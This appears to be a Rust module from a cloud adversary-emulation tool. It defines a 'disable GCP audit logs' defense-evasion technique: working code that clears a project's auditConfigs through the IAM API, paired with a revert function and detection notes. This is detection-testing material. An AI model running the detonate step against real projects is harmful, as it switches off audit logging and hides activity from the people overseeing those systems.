use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

async fn gcp_token() -> Result<String> {
    if let Ok(token) = std::env::var("GOOGLE_ACCESS_TOKEN") {
        return Ok(token);
    }
    let output = tokio::process::Command::new("gcloud")
        .args(["auth", "print-access-token"])
        .output()
        .await?;
    let token = String::from_utf8(output.stdout)?.trim().to_string();
    if token.is_empty() {
        anyhow::bail!("Could not obtain GCP access token via gcloud CLI");
    }
    Ok(token)
}

async fn gcp_project() -> Result<String> {
    std::env::var("GOOGLE_PROJECT_ID")
        .map_err(|_| anyhow::anyhow!("GOOGLE_PROJECT_ID not set"))
}

async fn detonate_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    // GET current IAM policy for the project audit config
    let get_url = format!(
        "https://cloudresourcemanager.googleapis.com/v1/projects/{}:getIamPolicy",
        project
    );
    let policy: serde_json::Value = http
        .post(&get_url)
        .bearer_auth(&token)
        .json(&serde_json::json!({}))
        .send()
        .await?
        .json()
        .await?;

    // Build updated policy: clear all auditConfigs
    let mut updated = policy.clone();
    updated["auditConfigs"] = serde_json::json!([]);

    let set_url = format!(
        "https://cloudresourcemanager.googleapis.com/v1/projects/{}:setIamPolicy",
        project
    );
    let body = serde_json::json!({ "policy": updated });
    let resp = http
        .post(&set_url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() {
        println!(
            "Cleared all audit log configurations for project '{}' — audit logs are now disabled",
            project
        );
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to disable audit logs ({}): {}", status, text);
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    // GET current policy
    let get_url = format!(
        "https://cloudresourcemanager.googleapis.com/v1/projects/{}:getIamPolicy",
        project
    );
    let mut policy: serde_json::Value = http
        .post(&get_url)
        .bearer_auth(&token)
        .json(&serde_json::json!({}))
        .send()
        .await?
        .json()
        .await?;

    // Restore default audit configs: DATA_READ, DATA_WRITE, ADMIN_READ for allServices
    policy["auditConfigs"] = serde_json::json!([{
        "service": "allServices",
        "auditLogConfigs": [
            { "logType": "ADMIN_READ" },
            { "logType": "DATA_READ" },
            { "logType": "DATA_WRITE" }
        ]
    }]);

    let set_url = format!(
        "https://cloudresourcemanager.googleapis.com/v1/projects/{}:setIamPolicy",
        project
    );
    let body = serde_json::json!({ "policy": policy });
    let resp = http
        .post(&set_url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() {
        println!("Restored audit log configuration for project '{}'", project);
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to restore audit logs ({}): {}", status, text);
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "gcp.defense-evasion.disable-audit-logs",
        friendly_name: "Disable GCP Audit Logs",
        description: "Clears all GCP Cloud Audit Log configurations from the project IAM policy, disabling DATA_READ, DATA_WRITE, and ADMIN_READ audit logging for all services.",
        detection: "GCP Audit Log: SetIamPolicy with auditConfigs removal. Cloud Security Command Center: Audit logging disabled finding.",
        platform: Platform::Gcp,
        mitre_tactics: &[MitreTactic::DefenseEvasion],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: Some(revert),
    }
}
